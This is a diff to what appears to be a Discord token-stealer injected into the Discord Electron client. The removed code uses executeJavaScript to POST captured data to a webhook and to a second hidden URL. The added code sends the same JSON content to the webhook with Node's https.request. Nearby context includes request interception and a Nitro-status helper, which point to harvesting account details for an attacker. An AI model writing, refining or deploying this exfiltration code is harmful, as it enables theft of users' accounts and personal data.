@@ -306,29 +306,28 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (w, W) => {
   W({})
   return
 })
-function SendToWebhook(a) {
-  const w = BrowserWindow.getAllWindows()[0]
-  w.webContents
-    .executeJavaScript(
-      '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
-        webhook +
-        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
-        a +
-        '));\n    ',
-      true
-    )
-    .then((W) => {})
-  w.webContents
-    .executeJavaScript(
-      '    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
-        src +
-        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
-        a +
-        '));\n    ',
-      true
-    )
-    .then((W) => {})
-}
+const SendToWebhook = async (content) => {
+  const data = JSON.stringify(content);
+  const url = new URL(webhook);
+  const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    },
+  };
+  const req = https.request(options);
+
+  req.on("error", (err) => {
+    console.log(err);
+  });
+  req.write(data);
+  req.end();
+};
+
 function GetNitro(w) {
   if (w == 0) {
     return '`No Nitro`'
